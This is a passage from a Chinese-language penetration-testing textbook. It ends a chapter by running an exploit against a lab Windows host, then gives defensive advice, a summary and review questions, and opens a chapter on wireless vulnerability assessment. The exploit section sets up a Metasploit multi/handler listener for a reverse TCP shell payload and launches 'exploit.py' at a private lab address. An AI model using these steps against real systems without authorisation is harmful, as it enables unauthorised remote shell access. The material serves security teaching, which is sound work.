    ## 运行完成的漏洞利用程序


    要完成漏洞利用，我们需要一个监听器来在载荷执行后接收 Shell。我们可以使用 Metasploit 中的多功能处理程序来实现这一点。在一个新的终端中，使用以下命令：


    ```

    msfconsole

    use exploit/multi/handler

    ```


    你应该会看到 `exploit(multi/handler)` 提示符。我们只需将载荷设置为与我们之前创建 Shellcode 时指定的内容相匹配，在本例中是一个反向
    TCP Shell。


    ```

    set payload windows/shell/reverse_tcp

    ```


    接下来，设置适当的监听主机：


    ```

    set lhost 192.168.1.128

    ```


    以及监听端口：


    ```

    set lport 9001

    ```


    然后我们可以启动处理程序：


    ```

    Run

    ```


    我们之前输入的命令输出可以在*图 5.33*中看到：


    ![](img/Figure-5.33.jpg)


    **图 5.33：** msfconsole 命令


    它将监听任何传入的连接，如果一切顺利，一旦我们的漏洞利用完成，我们将获得一个 Meterpreter 会话。


    最后，一切应该都已就绪。我们可以像之前测试运行时那样，从漏洞利用目录中启动漏洞利用程序，如*图 5.34*所示：


    ```

    python exploit.py 192.168.1.129

    ```


    ![](img/Figure-5.34.jpg)


    **图 5.34：** 运行漏洞利用程序


    这一次我们应该会看到不同的结果。忽略错误信息，如果第一次不成功，请再试一次。一旦漏洞利用成功完成，我们应该会在监听器上看到一个会话打开，如*图 5.35*所示：


    ![](img/Figure-5.35.jpg)


    **图 5.35：** msfconsole 输出


    我们可以使用 `whoami` 命令验证是否已攻陷目标，如*图 5.36*所示：


    ![](img/Figure-5.36.jpg)


    **图 5.36：** whoami 命令输出


    恭喜！通过无线网络，我们成功检测并利用了一个易受攻击的主机。


    # 防范威胁


    我们必须时刻了解如何防御这些威胁和攻击。之后，我们将介绍如何防御这些攻击。


    # 主机识别防范


    中小型企业应部署硬件防火墙，如 WatchGuard XTM、Cisco ASA，或下一代防火墙，如 FortiGate、Palo Alto 和 Checkpoint，并配置自定义规则以阻止未使用的服务和端口，从而保护自己免受威胁和危险。为防止未经授权的访问，应在服务器或网络设备上禁用未使用的服务。部署具备短信或电子邮件告警功能的入侵检测系统。应记录协议日志，并由防火墙标记告警。


    如果防火墙或 IDS 未被监控，你如何知道你的组织是否已被入侵？如果你想在威胁和问题面前保持领先，每天监控网络至关重要。可以使用 VLAN 来隔离网络。为了防止网络病毒和攻陷，每台服务器、工作站、VoIP
    设备和无线设备都应拥有自己的 VLAN。


    # 防止他人确定你的网络规模


    在评估网络规模时，任何敏感信息（包括网络拓扑图、密码、日志、工作站和服务器信息以及配置设置）都应始终加密。中小型企业可以使用硬件防火墙，如 WatchGuard
    XTM 或 Cisco ASA，通过阻止 ICMP 并仅允许来自可信来源的流量来控制流量。


    # 易受攻击主机的防护


    安装供应商提供的最新安全更新，以保护计算机和网络设备免遭利用。当新的操作系统和软件更新可用时，及时安装。如果升级过程中遇到问题，请联系软件供应商。使用最安全的
    Wi-Fi 加密标准 WPA2 或 WPA3，它们采用 AES 加密技术和长密码。在所有工作站和服务器上运行具有最新病毒定义库的实时防病毒扫描器。员工应接受安全意识培训。


    # 总结


    哇！在本章中，我们完成了三个演示！本章非常有趣，也相当精彩。让我们回顾一下你迄今为止学到的内容。


    在本章中，我们探讨了为什么在执行网络渗透测试时确定存活主机数量至关重要。之后，我们使用 Kali Linux 检测网络上的主机。然后，作为一名渗透测试员，我们演示了如何确定网络规模以及为什么了解这一点很重要。我们通过演示如何使用
    Nessus 漏洞扫描器发现 Windows 7 中的漏洞，以及列出可能的缓解措施，结束了本章。


    在下一章中，我们将介绍如何组织漏洞评估、配置 Nessus 漏洞扫描器、运行扫描器以及修补漏洞。现在让我们开始下一章的学习吧！


    # 问题


    1.  列举最著名的网络拓扑绘制工具。


    2.  我们如何确定网络规模？


    3.  我们如何详细检测网络中的易受攻击主机？


    4.  有哪些防范方法可以保护我们免受攻击？


    # 第 6 章


    # 无线漏洞评估


    # 简介


    在上一章中，我们讨论了如何进入网络并发现其中有谁。在本章中，我们将探讨漏洞评估，这引出了一个问题：究竟什么是漏洞评估？


    漏洞评估，也称为漏洞分析，是安全专业人员发现、识别和分类计算机系统、网络或其他电子基础设施中潜在安全漏洞（漏洞）的过程。漏洞评估也可用于评估威胁并提出适当的对策。在进行漏洞评估时，大多数安全专家遵循循序渐进的程序。以下是典型的漏洞评估流程：


    *   识别和分类计算机系统和网络

    *   列出最关键的服务清单

    *   识别每项服务可能面临的安全威胁

    *   制定防御策略以应对潜在威胁

    *   寻找措施以在遭受攻击时将风险降至最低


    如果个人或组织发现漏洞，他们有责任通知供应商。零日漏洞是指在未通知供应商的情况下被发现的高级别威胁漏洞。当开发者未解决或修补漏洞时，零日攻击就会盛行。当供应商的设备或软件不再受支持时，这种情况众所周知。


    如果威胁较小，供应商很可能会等到下一次更新发布补修。这完全取决于威胁的性质及其能力。允许远程执行代码，或更糟的是，未经授权获取 root 或管理员权限的漏洞应尽快修补；但这并不总是如此。这取决于供应商如何处理此类情况。组织可能无力承担修补成本。


